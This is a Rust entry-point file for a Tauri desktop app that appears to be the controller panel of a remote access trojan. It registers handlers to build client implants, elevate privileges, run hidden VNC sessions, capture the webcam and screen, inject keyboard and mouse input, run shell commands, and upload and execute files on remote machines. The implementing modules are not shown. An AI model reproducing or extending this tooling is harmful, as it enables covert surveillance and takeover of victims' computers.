#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
use std::sync::{ Arc, Mutex };

mod handlers;
mod server;
mod commands;
mod client;
mod utils;

use handlers::{
    tauri::*,
    SharedTauriState,
    TauriState,
};

#[tokio::main(worker_threads = 3)]
async fn main() {
    tauri::Builder::default()
        .manage(SharedTauriState(Arc::new(Mutex::new(TauriState::default()))))
        .invoke_handler(tauri::generate_handler![
            start_server,
            stop_server,
            fetch_state,
            build_client,
            fetch_clients,
            fetch_client,
            manage_client,
            take_screenshot,
            handle_system_command,
            read_files,
            manage_file,
            process_list,
            kill_process,
            manage_shell,
            execute_shell_command,
            visit_website,
            send_messagebox,
            test_messagebox,
            elevate_client,
            read_icon,
            read_exe,
            start_reverse_proxy,
            stop_reverse_proxy,
            request_webcam,
            start_remote_desktop,
            stop_remote_desktop,
            send_mouse_click,
            send_keyboard_input,
            manage_hvnc,
            upload_and_execute,
            execute_file,
            read_file_for_upload,
            upload_file_to_folder,
        ])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
